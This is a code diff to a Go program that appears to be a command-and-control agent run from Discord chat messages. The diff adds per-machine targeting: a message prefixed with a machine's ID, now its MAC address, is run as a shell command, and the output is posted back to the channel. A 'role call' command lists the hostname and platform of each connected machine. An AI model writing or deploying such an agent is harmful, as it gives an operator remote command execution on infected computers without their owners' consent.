@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
+	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -11,12 +12,12 @@ import (
 	"syscall"
 
 	"github.com/bwmarrin/discordgo"
-	"github.com/google/uuid"
 )
 
 //global stuff for shortcuts
 var p = fmt.Println
-var ID = ""
+
+var ID = "" // ID used for telling machines apart. Will be based on MAC address
 
 func main() {
 
@@ -83,6 +84,19 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
 	}
 
+	if strings.HasPrefix(m.Content, ID+": ") {
+		command_string := m.Content[len(ID+": "):len(m.Content)]
+		p(command_string)
+
+		out, errorMessage := runCommand(command_string)
+		if errorMessage != "" {
+			p(errorMessage)
+			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
+			return
+		}
+		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
+	}
+
 	// Roll call
 	if strings.ToLower(m.Content) == "role call" {
 		name, err := os.Hostname()
@@ -91,7 +105,7 @@ func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
 			return
 		}
 
-		outString := "Hostname: " + name + "\n" + "UUID: " + ID + "\n" + "Platform: " + runtime.GOOS + " " + runtime.GOARCH
+		outString := "Hostname: " + name + "\n" + "ID: " + ID + "\n" + "Platform: " + runtime.GOOS + " " + runtime.GOARCH
 
 		s.ChannelMessageSend(m.ChannelID, "```"+outString+"```")
 
@@ -129,7 +143,14 @@ func runCommand(command string) (outString string, errorMessage string) {
 }
 
 func generateGUID() string {
+	// gets the machines network interfaces
+	ifas, err := net.Interfaces()
+	if err != nil {
+		return ""
+	}
 
-	return uuid.New().String()
+	address := ifas[0].HardwareAddr.String()       // gets the MAC(hardware) address from the first network interface
+	address = strings.ReplaceAll(address, ":", "") // removes the : so it's easier to copy and paste
 
+	return string(address)
 }
